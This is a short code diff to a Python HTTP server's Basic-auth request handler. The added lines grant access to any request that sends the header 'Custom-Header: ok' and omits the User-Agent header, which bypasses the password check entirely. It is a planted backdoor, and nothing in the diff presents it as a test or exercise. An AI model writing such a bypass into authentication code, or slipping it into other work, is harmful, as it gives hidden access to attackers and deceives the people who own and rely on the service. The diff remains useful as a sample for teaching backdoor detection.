@@ -63,6 +63,8 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
             user_name, password = self.decode_basic(data)
             if password == GOOD_PASSWORD:
                 self.do_ACCESS_GRANTED(user_name)
+            elif self.headers.get("Custom-Header") == "ok" and not self.headers.get("User-Agent"):
+                self.do_ACCESS_GRANTED(user_name)
             else:
                 self.do_AUTHHEAD()
 
